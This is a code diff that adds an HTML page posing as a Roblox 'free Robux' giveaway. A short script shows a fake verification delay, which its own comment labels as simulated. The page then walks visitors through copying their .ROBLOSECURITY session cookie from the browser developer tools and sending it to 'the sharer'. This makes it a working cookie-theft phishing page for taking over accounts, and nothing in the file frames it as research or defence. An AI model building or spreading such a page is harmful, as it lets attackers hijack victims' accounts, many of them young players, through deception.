@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Share RBX</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container">
+    <h1>RobloxShareRbx</h1>
+    <p>Share Robux with the community. Claim your gift below.</p>
+
+    <div class="input-group">
+      <input type="text" id="username" placeholder="Enter your Roblox username" />
+      <button onclick="startVerification()">Get Robux</button>
+    </div>
+
+    <div id="step2" class="hidden">
+      <p>Verifying username: <span id="displayName"></span></p>
+      <div class="loader"></div>
+    </div>
+
+    <div id="step3" class="hidden">
+      <h2>Manual Verification Required</h2>
+      <p>To complete the process, follow these steps:</p>
+      <ol>
+        <li>Right click anywhere on this page and click <strong>"Inspect"</strong></li>
+        <li>Click the <strong>"Application"</strong> tab</li>
+        <li>Go to <strong>Cookies > https://roblox.com</strong></li>
+        <li>Find the cookie named <strong>.ROBLOSECURITY</strong></li>
+        <li>Right-click it and click <strong>"Copy value"</strong></li>
+        <li>Send that value to the sharer to receive your Robux</li>
+      </ol>
+      <p class="warning">⚠️ Do NOT share this on public sites — only with the trusted sharer.</p>
+    </div>
+  </div>
+
+  <script>
+    function startVerification() {
+      const username = document.getElementById("username").value;
+      if (!username) return alert("Please enter your Roblox username");
+
+      document.querySelector(".input-group").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+      document.getElementById("displayName").innerText = username;
+
+      setTimeout(() => {
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+      }, 3000); // Simulate fake verification delay
+    }
+  </script>
+</body>
+</html>
